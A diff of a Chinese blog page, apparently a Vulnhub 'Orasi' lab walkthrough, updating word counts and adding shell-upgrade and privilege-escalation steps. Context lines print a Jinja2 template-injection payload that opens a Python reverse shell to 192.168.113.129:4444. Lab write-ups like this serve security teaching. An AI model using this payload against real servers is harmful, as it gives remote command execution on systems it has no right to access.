@@ -417,14 +417,14 @@ nmap -p- -sV -A 192.168.113.132
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        1.9k
+                        2k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        9 分
+                        10 分
                     </div>
                     
                 
@@ -489,7 +489,7 @@ OS details: Linux 4.15 - 5.6
 Network Distance: 1 hop
 Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
-</code></pre><p>发现开放了80端口，访问主机ip，发现没有什么特别的东西，就两行字符串，也没有cms之类的站点。而且开放了5000端口的python服务，暂时不知道用处</p>
+</code></pre><h3 id="拿下shell"><a href="#拿下shell" class="headerlink" title="拿下shell"></a>拿下shell</h3><p>发现开放了80端口，访问主机ip，发现没有什么特别的东西，就两行字符串，也没有cms之类的站点。而且开放了5000端口的python服务，暂时不知道用处</p>
 <p>内容如下：</p>
 <pre><code>
 Orasi
@@ -636,7 +636,21 @@ ________________________________________________
 &#123;% for x in ().__class__.__base__.__subclasses__() %&#125;&#123;% if "warning" in x.__name__ %&#125;&#123;&#123;x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.113.129\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read()&#125;&#125;&#123;%endif%&#125;&#123;% endfor %&#125;
 
 </code></pre><p>可以看到靶机成功上线</p>
-<p><img src="http://alexjakin.github.io/medias/reward/vulnhub/1orasi/1.png" alt="成功上线"></p>
+<p><img src="http://alexjakin.github.io/medias/reward/vulnhub/orasi/1.png" alt="成功上线"></p>
+<p>修改交互模式</p>
+<blockquote>
+<p>python -c ‘import pty;pty.spawn(“/bin/bash”)’ </p>
+</blockquote>
+<h3 id="提权-kori"><a href="#提权-kori" class="headerlink" title="提权 kori"></a>提权 kori</h3><p>查看当前有多少用户</p>
+<pre><code>www-data@orasi:~/html$ ls -la /home
+ls -la /home
+total 16
+drwxr-xr-x  4 root  root  4096 Feb 11  2021 .
+drwxr-xr-x 18 root  root  4096 Feb 11  2021 ..
+drwxr-xr-x  3 irida irida 4096 Feb 11  2021 irida
+drwxr-xr-x  3 kori  kori  4096 Feb 11  2021 kori
+
+</code></pre><p>输入 sudo -l，发现当前用户是挂靠在<strong>kori</strong>上的，对一些参数进行了过滤</p>
 
             </div>
             <hr/>
@@ -1084,7 +1098,7 @@ Vulnhub是仿真渗透环境，攻击者通过一系列完整的渗透思路，�
 
             
                 &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-                <span class="white-color">69.3k</span>
+                <span class="white-color">69.4k</span>
             
 
             
@@ -1172,6 +1186,22 @@ $(function () {
 
     <script async src="/libs/others/busuanzi.pure.mini.js"></script>
 
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
 
 </body>
 </html>
